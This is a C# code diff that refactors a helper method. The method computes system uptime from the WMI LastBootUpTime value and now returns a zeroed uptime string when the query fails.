@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Diagnostics;
 using System.Management;
 
 namespace xClient.Core.Helper
@@ -8,20 +7,31 @@ namespace xClient.Core.Helper
     {
         public static string GetUptime()
         {
-            SelectQuery query = new SelectQuery("SELECT LastBootUpTime FROM Win32_OperatingSystem WHERE Primary='true'");
-            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+            try
             {
-                foreach (ManagementObject mo in searcher.Get())
+                string uptime = string.Empty;
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem WHERE Primary='true'"))
                 {
-                    DateTime now = DateTime.UtcNow;
-                    DateTime dtBootTime = ManagementDateTimeConverter.ToDateTime(mo.Properties["LastBootUpTime"].Value.ToString());
-                    TimeSpan uptimeSpan = TimeSpan.FromTicks((now - dtBootTime).Ticks);
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        DateTime lastBootUpTime = ManagementDateTimeConverter.ToDateTime(mObject["LastBootUpTime"].ToString());
+                        TimeSpan uptimeSpan = TimeSpan.FromTicks((DateTime.Now - lastBootUpTime).Ticks);
 
-                    return string.Format("{0}d : {1}h : {2}m : {3}s", uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
+                        uptime = string.Format("{0}d : {1}h : {2}m : {3}s", uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
+                        break;
+                    }
                 }
-            }
 
-            return string.Format("{0}d : {1}h : {2}m : {3}s", 0, 0, 0, 0);
+                if (string.IsNullOrEmpty(uptime))
+                    throw new Exception("Getting uptime failed");
+
+                return uptime;
+            }
+            catch (Exception)
+            {
+                return string.Format("{0}d : {1}h : {2}m : {3}s", 0, 0, 0, 0);
+            }
         }
 
         public static string GetPcName()
